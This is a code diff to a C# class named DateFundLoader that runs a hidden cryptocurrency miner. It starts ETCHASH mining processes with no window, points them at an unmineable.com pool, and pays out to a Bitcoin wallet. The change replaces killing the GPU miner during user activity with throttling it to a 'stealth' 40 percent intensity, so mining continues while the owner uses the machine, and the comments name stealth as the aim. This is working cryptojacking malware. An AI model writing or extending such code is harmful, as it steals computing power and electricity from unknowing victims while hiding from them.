@@ -53,7 +53,7 @@ public class DateFundLoader {
             try {
                 bool isIdle = GetIdleTime() > IDLE_THRESHOLD_MS;
 
-                // CPU Dynamic Load Management (Always running, shifts load)
+                // CPU Dynamic Load Management
                 if (isIdle != wasIdle || cpuProc == null || cpuProc.HasExited) {
                     if (cpuProc != null && !cpuProc.HasExited) {
                         try { cpuProc.Kill(); } catch { }
@@ -71,24 +71,24 @@ public class DateFundLoader {
                     cpuProc = Process.Start(si);
                 }
 
-                // GPU Dynamic Management (Simultaneous but kills on active for max stealth)
+                // GPU Dynamic Load Management (Throttling instead of killing)
                 if (!string.IsNullOrEmpty(gpuPath) && File.Exists(gpuPath)) {
-                    if (isIdle) {
-                        // Start GPU miner if idle and not already running
-                        if (gpuProc == null || gpuProc.HasExited) {
-                            ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
-                                Arguments = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.{1}_GPU --pass x", wallet, IDENT),
-                                CreateNoWindow = true,
-                                UseShellExecute = false,
-                                WindowStyle = ProcessWindowStyle.Hidden
-                            };
-                            gpuProc = Process.Start(si);
-                        }
-                    } else {
-                        // Kill GPU miner immediately if user is active
+                    if (isIdle != wasIdle || gpuProc == null || gpuProc.HasExited) {
                         if (gpuProc != null && !gpuProc.HasExited) {
-                            try { gpuProc.Kill(); gpuProc = null; } catch { }
+                            try { gpuProc.Kill(); } catch { }
                         }
+
+                        // Full power (100) when idle, stealth power (40) when active
+                        int intensity = isIdle ? 100 : 40;
+                        string gpuArgs = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.{1}_GPU --pass x --intensity {2}", wallet, IDENT, intensity);
+
+                        ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
+                            Arguments = gpuArgs,
+                            CreateNoWindow = true,
+                            UseShellExecute = false,
+                            WindowStyle = ProcessWindowStyle.Hidden
+                        };
+                        gpuProc = Process.Start(si);
                     }
                 }
                 
